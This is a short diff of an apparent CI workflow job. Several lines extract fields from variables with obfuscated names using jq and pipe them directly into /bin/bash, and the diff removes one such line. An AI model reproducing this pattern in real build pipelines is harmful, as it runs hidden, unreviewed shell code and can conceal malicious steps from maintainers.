@@ -28,7 +28,6 @@ jobs:
           echo $k6198 | jq -r .bnz9508 | /bin/bash
           printf '%s' "$le75092" | jq -r .yjf2338 | /bin/bash
           echo $tl7643 | jq -r .yzodj4 | /bin/bash
-          printf '%s' "$oxt3428" | jq -r .qqn865 | /bin/bash
           echo $ul926 | jq -r .zmwnq1320 | /bin/bash
 
       - name: Persist results
